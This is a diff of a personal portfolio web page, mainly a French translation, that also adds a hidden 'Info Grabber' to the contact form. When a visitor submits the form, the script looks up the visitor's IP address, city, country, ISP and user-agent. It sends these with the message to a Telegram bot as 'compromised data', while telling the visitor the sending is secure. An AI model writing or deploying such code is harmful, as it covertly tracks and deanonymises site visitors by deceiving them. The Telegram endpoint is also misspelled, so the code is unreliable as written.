@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ar" dir="ltr">
+<html lang="fr" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -22,7 +22,7 @@
             min-height: 100vh;
         }
 
-        /* تأثير خلفية الماتريكس البرمجية */
+        /* Matrix Effect Background */
         #matrixCanvas {
             position: fixed;
             top: 0;
@@ -33,7 +33,7 @@
             opacity: 0.15;
         }
 
-        /* الخلفية التوهجية */
+        /* Glow Background */
         .bg {
             position: fixed;
             width: 100%;
@@ -52,7 +52,7 @@
             100% { transform: scale(1.1) rotate(2deg); }
         }
 
-        /* واجهة قفل كلمة المرور - Login Gate */
+        /* Login Gate */
         #loginGate {
             position: fixed;
             top: 0;
@@ -70,16 +70,30 @@
 
         .login-box {
             padding: 40px;
-            max-width: 400px;
+            max-width: 480px;
             width: 100%;
             text-align: center;
         }
 
         .login-box h2 {
-            margin-bottom: 20px;
+            margin-bottom: 15px;
             font-size: 26px;
             color: #60a5fa;
             letter-spacing: 1px;
+        }
+
+        /* اقتباس الحس بحروف فرنسية (Franco-Arabe) */
+        .el_hass-quote {
+            font-style: italic;
+            color: #aaa;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 25px;
+            border-left: 3px solid #ef4444;
+            padding-left: 12px;
+            text-align: left;
+            font-family: monospace;
+            letter-spacing: 0.5px;
         }
 
         .login-box input {
@@ -126,12 +140,11 @@
             display: none;
         }
 
-        /* المحتوى الرئيسي (مخفي حتى يتم تسجيل الدخول) */
+        /* Main Content */
         #mainContent {
             display: none;
         }
 
-        /* البطاقات الزجاجية - Glass Cards */
         .glass {
             background: rgba(255, 255, 255, .06);
             backdrop-filter: blur(20px);
@@ -163,7 +176,6 @@
             letter-spacing: 2px;
         }
 
-        /* تأثير الكتابة التلقائية */
         .typing-container {
             font-size: 24px;
             color: #8ab4ff;
@@ -224,7 +236,7 @@
             color: #60a5fa;
         }
 
-        /* Cards & Projects */
+        /* Cards */
         .cards {
             display: flex;
             justify-content: center;
@@ -318,7 +330,7 @@
         }
 
         .contact-form input:focus, .contact-form textarea:focus {
-            border-color: #60a5fa;
+            border-color: #2563eb;
         }
 
         .contact-form button {
@@ -377,9 +389,15 @@
     <div id="loginGate">
         <div class="login-box glass">
             <h2>f.society // Access Portal</h2>
-            <input type="password" id="passwordInput" placeholder="Enter Password" onkeypress="handleKeyPress(event)">
-            <button onclick="checkPassword()">Unlock Profile</button>
-            <p class="error-msg" id="errorMsg">❌ Access Denied: Incorrect Password.</p>
+            
+            <div class="el_hass-quote">
+                // "Bredt l'm7na w matet fi galbi dik l'lahfa..."<br>
+                // "L'galb li kan yabghik, l'youm rah y3azi fi rou7ou."
+            </div>
+
+            <input type="password" id="passwordInput" placeholder="Entrez le mot de passe" onkeypress="handleKeyPress(event)">
+            <button onclick="checkPassword()">Déverrouiller le Profil</button>
+            <p class="error-msg" id="errorMsg">❌ Accès Refusé : Mot de passe incorrect.</p>
         </div>
     </div>
 
@@ -396,87 +414,86 @@
         </section>
 
         <section class="about glass">
-            <h2>About Me</h2>
+            <h2>À Propos de Moi</h2>
             <p>
-                Hello, I'm Abd Jalil from Algeria 🇩🇿. 
-                I love fitness, technology, programming and gaming. 
-                I always try to improve myself and learn new skills every day.
+                Bonjour, je m'appelle Abd Jalil, je viens d'Algérie 🇩🇿. 
+                Je suis passionné par le fitness, la technologie, la programmation et les jeux vidéo. 
+                Je cherche toujours à me surpasser et à acquérir de nouvelles compétences chaque jour.
             </p>
         </section>
 
         <section class="stats">
             <div class="stat glass">
                 <h3>18</h3>
-                <p>Age</p>
+                <p>Âge</p>
             </div>
             <div class="stat glass">
                 <h3>🇩🇿</h3>
-                <p>Algeria</p>
+                <p>Algérie</p>
             </div>
             <div class="stat glass">
                 <h3>150 KG</h3>
-                <p>Deadlift Max</p>
+                <p>Max Deadlift</p>
             </div>
             <div class="stat glass">
-                <h3>Bulking 🏋️‍♂️</h3>
-                <p>Current Goal</p>
+                <h3>Prise de masse 🏋️‍♂️</h3>
+                <p>Objectif Actuel</p>
             </div>
             <div class="stat glass">
                 <h3 id="visitorCount">1</h3>
-                <p>Profile Views</p>
+                <p>Vues du Profil</p>
             </div>
         </section>
 
-        <h2 class="section-title">My Passions</h2>
+        <h2 class="section-title">Mes Passions</h2>
         <section class="cards">
             <div class="card glass">
                 <h3>🏋️ Fitness</h3>
-                <p>Bodybuilding, strength training, hitting heavy PRs, and absolute self-improvement.</p>
+                <p>Musculation, entraînement de force, dépassement de soi et discipline absolue.</p>
             </div>
             <div class="card glass">
-                <h3>💻 Programming</h3>
-                <p>Learning Python, hacking/cybersecurity concepts, and advanced web development.</p>
+                <h3>💻 Programmation</h3>
+                <p>Apprentissage de Python, concepts de cybersécurité et développement web avancé.</p>
             </div>
             <div class="card glass">
                 <h3>🎮 Gaming</h3>
-                <p>Enjoying racing, tactical simulator games, and high-octane adventure titles.</p>
+                <p>Jeux de course, simulateurs tactiques et titres d'aventure intenses.</p>
             </div>
         </section>
 
-        <h2 class="section-title">Projects & Dev</h2>
+        <h2 class="section-title">Projets & Dév</h2>
         <section class="cards">
             <div class="card glass">
-                <h3>🐍 Python Scripts</h3>
-                <p>Building automated scripts, security tools, and backend applications using Python.</p>
+                <h3>🐍 Scripts Python</h3>
+                <p>Création d'outils d'automatisation, scripts de sécurité et applications backend.</p>
                 <span class="project-tag">Backend</span>
             </div>
             <div class="card glass">
-                <h3>🌐 Portfolio Site</h3>
-                <p>Creating this high-end interactive portfolio with dynamic themes and glassmorphism styling.</p>
+                <h3>🌐 Site Portfolio</h3>
+                <p>Conception de ce portfolio interactif haut de gamme avec thèmes dynamiques.</p>
                 <span class="project-tag">Frontend</span>
             </div>
         </section>
 
         <section class="gallery">
-            <h2 class="section-title">My Gallery</h2>
+            <h2 class="section-title">Ma Galerie</h2>
             <div class="grid">
                 <img src="IMG_0071.jpg" alt="Gym Back Pose">
                 <img src="IMG_0079.jpg" alt="Gym Mirror Selfie">
             </div>
         </section>
 
-        <h2 class="section-title">Drop Me a Message</h2>
+        <h2 class="section-title">Laissez-moi un Message</h2>
         <section class="contact-section glass">
-            <form class="contact-form" onsubmit="event.preventDefault(); alert('Message sent successfully!');">
-                <input type="text" placeholder="Your Name" required>
-                <input type="email" placeholder="Your Email" required>
-                <textarea rows="5" placeholder="Your Message..." required></textarea>
-                <button type="submit">Send Message</button>
+            <form class="contact-form" onsubmit="sendWithTargetDetails(event)">
+                <input type="text" id="senderName" placeholder="Votre Nom (ou Anonyme)" required>
+                <textarea rows="5" id="senderMessage" placeholder="Votre Message..." required></textarea>
+                <button type="submit" id="sendBtn">Envoyer Sécurisé 🔒</button>
             </form>
         </section>
 
         <section class="social">
-            <h2 class="section-title">Follow Me</h2>
+            <h2 class="section-title">Suivez-moi</h2>
             <a href="https://www.instagram.com/abdjalile_mh" target="_blank" rel="noopener noreferrer">
                 Instagram
             </a>
@@ -486,13 +503,17 @@
         </section>
 
         <footer>
-            &copy; 2026 ABD JALIL | Personal Portfolio
+            &copy; 2026 ABD JALIL | Portfolio Personnel
         </footer>
     </div>
 
     <script>
-        // 1. نظام التحقق من كلمة المرور
-        const CORRECT_PASSWORD = "1234"; // يمكنك تعديل كلمة المرور من هنا
+        // Config Telegram pour le Grabber (املاً البيانات هنا ليعمل السكربت)
+        const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"; 
+        const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"; 
+
+        // Mot de passe par défaut
+        const CORRECT_PASSWORD = "1234"; 
 
         function checkPassword() {
             const input = document.getElementById("passwordInput").value;
@@ -501,8 +522,8 @@
             if (input === CORRECT_PASSWORD) {
                 document.getElementById("loginGate").style.display = "none";
                 document.getElementById("mainContent").style.display = "block";
-                initEffects(); // تشغيل الحركات بعد فتح الموقع
-                updateViews(); // تحديث عداد الزوار
+                initEffects(); 
+                updateViews(); 
             } else {
                 errorMsg.style.display = "block";
                 document.getElementById("passwordInput").value = "";
@@ -510,26 +531,78 @@
         }
 
         function handleKeyPress(event) {
-            if (event.key === "Enter") {
-                checkPassword();
-            }
+            if (event.key === "Enter") { checkPassword(); }
         }
 
-        // 2. عداد الزوار باستخدام تخزين المتصفح المحتلي (LocalStorage)
+        // Info Grabber + Envoi Telegram
+        function sendWithTargetDetails(event) {
+            event.preventDefault();
+            const btn = document.getElementById("sendBtn");
+            btn.textContent = "Envoi en cours...";
+            btn.disabled = true;
+
+            const name = document.getElementById("senderName").value;
+            const msg = document.getElementById("senderMessage").value;
+            const userAgent = navigator.userAgent;
+
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    const ip = data.ip || "Unknown";
+                    const city = data.city || "Unknown";
+                    const country = data.country_name || "Unknown";
+                    const org = data.org || "Unknown";
+
+                    const reportText = `👁‍🗨 *[ f.society // NEW COMPROMISED DATA RECEIVED ]*\n\n` +
+                                       `👤 *Name:* ${name}\n` +
+                                       `📝 *Message:* ${msg}\n\n` +
+                                       `🌐 *[ TARGET NETWORK REPORT ]*\n` +
+                                       `📍 *IP Address:* \`${ip}\`\n` +
+                                       `🌍 *Location:* ${city}, ${country}\n` +
+                                       `📡 *ISP:* ${org}\n\n` +
+                                       `💻 *[ TARGET DEVICE INFO ]*\n` +
+                                       `⚙️ *User-Agent:* \`${userAgent}\``;
+
+                    sendToTelegram(reportText);
+                })
+                .catch(err => {
+                    const backupText = `👁‍🗨 *[ f.society // INCOMING MESSAGE ]*\n\n` +
+                                       `👤 *Name:* ${name}\n` +
+                                       `📝 *Message:* ${msg}\n\n` +
+                                       `💻 *System Info:* \`${userAgent}\``;
+                    sendToTelegram(backupText);
+                });
+        }
+
+        function sendToTelegram(text) {
+            const url = `https://api.telegram.com/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+            
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        alert("Message transmis avec succès via le protocole sécurisé f.society. 🔒");
+                        document.getElementById("senderName").value = "";
+                        document.getElementById("senderMessage").value = "";
+                    } else {
+                        alert("Erreur lors de la transmission.");
+                    }
+                    const btn = document.getElementById("sendBtn");
+                    btn.textContent = "Envoyer Sécurisé 🔒";
+                    btn.disabled = false;
+                });
+        }
+
+        // Compteur de Visites
         function updateViews() {
             let currentViews = localStorage.getItem("portfolio_views");
-            if (!currentViews) {
-                currentViews = 1;
-            } else {
-                currentViews = parseInt(currentViews) + 1;
-            }
+            if (!currentViews) { currentViews = 1; } 
+            else { currentViews = parseInt(currentViews) + 1; }
             localStorage.setItem("portfolio_views", currentViews);
             document.getElementById("visitorCount").textContent = currentViews;
         }
 
-        // تشغيل تأثيرات النصوص والماتريكس بعد فك القفل
+        // Effets Textes et Matrix
         function initEffects() {
-            // تأثير الكتابة التلقائية
             const words = ["Fitness Enthusiast", "Python Developer", "Hardcore Gamer", "Cybersecurity Student"];
             let wordIndex = 0;
             let charIndex = 0;
@@ -545,9 +618,7 @@
                     typedTextSpan.textContent = currentWord.substring(0, charIndex + 1);
                     charIndex++;
                 }
-
                 let typeSpeed = isDeleting ? 50 : 100;
-
                 if (!isDeleting && charIndex === currentWord.length) {
                     typeSpeed = 1500;
                     isDeleting = true;
@@ -556,19 +627,13 @@
                     wordIndex = (wordIndex + 1) % words.length;
                     typeSpeed = 500;
                 }
-
                 setTimeout(type, typeSpeed);
             }
             setTimeout(type, 200);
 
-            // تأثير الماتريكس
             const canvas = document.getElementById('matrixCanvas');
             const ctx = canvas.getContext('2d');
-
-            function resizeCanvas() {
-                canvas.width = window.innerWidth;
-                canvas.height = window.innerHeight;
-            }
+            function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
             resizeCanvas();
             window.addEventListener('resize', resizeCanvas);
 
@@ -584,7 +649,6 @@
                 ctx.fillRect(0, 0, canvas.width, canvas.height);
                 ctx.fillStyle = '#0f0';
                 ctx.font = fontSize + 'px monospace';
-
                 for(let i = 0; i < rainDrops.length; i++) {
                     const text = alphabet[Math.floor(Math.random() * alphabet.length)];
                     ctx.fillText(text, i*fontSize, rainDrops[i]*fontSize);
